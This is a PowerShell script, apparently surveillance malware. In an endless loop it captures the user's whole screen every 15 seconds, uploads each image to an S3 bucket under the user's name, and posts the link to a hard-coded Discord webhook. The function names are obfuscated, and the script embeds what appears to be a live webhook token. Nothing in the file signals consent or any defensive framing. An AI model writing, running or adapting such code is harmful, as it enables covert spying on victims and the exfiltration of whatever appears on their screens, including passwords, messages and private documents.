if (-not (Get-InstalledModule -Name AWS.Tools.Common -ErrorAction SilentlyContinue)) {
    Install-Module -Name AWS.Tools.Installer -Force
    Install-AWSToolsModule -Name AWS.Tools.Common,AWS.Tools.S3 -CleanUp -Force
}

Import-Module -Name AWS.Tools.Common
Import-Module -Name AWS.Tools.S3

function fnfquir22@ {
    param (
        [string]$OutputFilePath
    )

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object -TypeName System.Drawing.Bitmap -ArgumentList $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)

    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)

    $bmp.Save($OutputFilePath)
    $graphics.Dispose()
    $bmp.Dispose()
}

function fnujsaw21@ {
    param (
        [string]$ImageFilePath,
        [string]$BucketName
    )

    $AWSRegion = "ca-central-1"
    $UserName = $env:UserName
    $Key = "$UserName/" + [guid]::NewGuid().ToString() + ".png"
        
    Write-S3Object -BucketName $BucketName -File $ImageFilePath -Key $Key -Region $AWSRegion
        
    $ImageUrl = "https://$BucketName.s3.$AWSRegion.amazonaws.com/$Key"
    return $ImageUrl
}

function fnuja2aw20@ {
    param (
        [string]$WebhookUrl,
        [string]$UserName,
        [string]$ImageUrl
    )

    $DateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Message = "U $UserName` $DateTime` $ImageUrl"

    $payload = @{
        content = $Message
    }

    $body = $payload | ConvertTo-Json -Depth 5  

    $headers = @{
        'Content-Type' = 'application/json'
    }

    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
}

$discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"
$awsS3BucketName = "strxt-1"

while ($true) {
    $outputFilePath = "$env:temp\$env:computername-Capture.png"
    fnfquir22@ -OutputFilePath $outputFilePath
    $imageUrl = fnujsaw21@ -ImageFilePath $outputFilePath -BucketName $awsS3BucketName
    fnuja2aw20@ -WebhookUrl $discordWebhookUrl -UserName $env:UserName -ImageUrl $imageUrl
    Start-Sleep -Seconds 15
}
